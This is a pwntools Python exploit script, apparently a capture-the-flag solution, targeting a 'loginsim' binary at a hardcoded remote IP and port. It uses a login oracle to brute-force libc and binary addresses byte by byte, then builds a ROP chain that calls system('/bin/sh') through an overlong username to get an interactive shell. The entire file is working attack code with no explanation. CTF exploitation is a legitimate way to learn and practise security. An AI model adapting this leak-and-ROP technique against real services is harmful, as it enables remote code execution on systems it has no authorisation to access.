from os import system
from pwn import *
from termcolor import colored

text = colored(' DEBUG ', 'red', attrs=['reverse', 'blink', 'bold'])
# context.log_level = 'DEBUG'
DEBUG = 0
file = './loginsim'
exe  = ELF(file)

def register(io, username, length):
    # success("=========================<REGISTER>=======================")
    io.sendlineafter(b"-> ", b"1")
    io.sendlineafter(b"{i} Username length: ", str(length).encode())
    io.sendafter(b"{i} Enter username: ", username)
    # info("username:     %s"     %   username)
    # info("length:       %d"     %   length)
    # success("=========================</REGISTER>======================")

def login(io, username):
    # success("=========================<LOGIN>=======================")
    io.sendlineafter(b"-> ", b"2")
    io.sendafter(b"{i} Username: ", username)
    # info("username:     %s"     %   username)
    # success("=========================</LOGIN>======================")
    recv = io.recvline()
    # print("recv:        ", recv)
    if b"Good job!" in recv:
        return 1
    else:
        return 0
    

def brute_force_libc(io, username, length):
    result = username
    payload = b""
    leaked = b""
    
    for i in range(length):
        for b in range(256):
            payload = result + bytes([b]) + b"\n"
            # print("Try:      %s"    %   payload)
            register(io, payload, len(result) + 1)
            if login(io, username + b"\n") == 1:
                leaked += bytes([b])
                result += bytes([b])
                # print("Result:      ",  leaked)
                if b == 0:
                    return leaked
                break
    
    return leaked

def brute_force_elf(io, username, length):
    result = username
    payload = b""
    leaked = b""
    for i in range(length):
        register(io, result + b"\n", len(result) + 1)
        for b in range(0, 256, 1):
            payload = result + bytes([b]) + b"\n"
            # info("Try %s"   %   payload)
            if login(io, payload) == 1:
                result = payload[:-1]
                leaked += bytes([b])
                # print("Result:      %s"     %   leaked)
                if b == 0:
                    return leaked
                break

    return leaked

def main(io, libc=None):
    # declared
    # exploit
    ################################################
    username = b"A"*0x20
    result = brute_force_libc(io, username, 8)
    _IO_2_1_stdout_ = u64(result.ljust(8, b"\x00"))
    info("_IO_2_1_stdout_:      %#x"    %   _IO_2_1_stdout_)
    libc.address = _IO_2_1_stdout_ - libc.sym['_IO_2_1_stdout_']
    info("Libc base:    %#x"    %       libc.address)

    bin_sh = next(libc.search(b"/bin/sh"))
    info("/bin/sh address:      %#x"    %   bin_sh)

    ################################################
    username = b"A"*0x78
    result = brute_force_elf(io, username, 8)
    __libc_csu_init = u64(result.ljust(8, b"\x00"))
    info("__libc_csu_init:      %#x"    %   __libc_csu_init)
    exe.address = __libc_csu_init - exe.sym['__libc_csu_init']
    info("Binary base:      %#x"    %   exe.address)

    ################################################
    pop_rsi = exe.address + 0x16d1
    pop_rdi = exe.address + 0x16d3
    username  = b" "*0xb8 
    username += p64(pop_rdi)
    username += p64(bin_sh)
    username += p64(pop_rsi)
    username += p64(0)
    username += p64(0)
    username += p64(libc.sym['system'])
    username += b"\n"
    register(io, username, 0x80)



if __name__ == '__main__':
    if DEBUG:
        libc = ELF('glibc/libc.so.6')
        #env = {'LD_PRELOAD': os.path.join(os.getcwd(), 'libc.so.6')}
        #io = process([os.path.join(os.getcwd(), 'ld-linux.so.2'), file], env=env)
        io = process(file)
        input(text)
    else:
        libc = ELF('glibc/libc.so.6')
        io = remote('167.99.202.193', 31047)
    
    main(io, libc)
    io.interactive()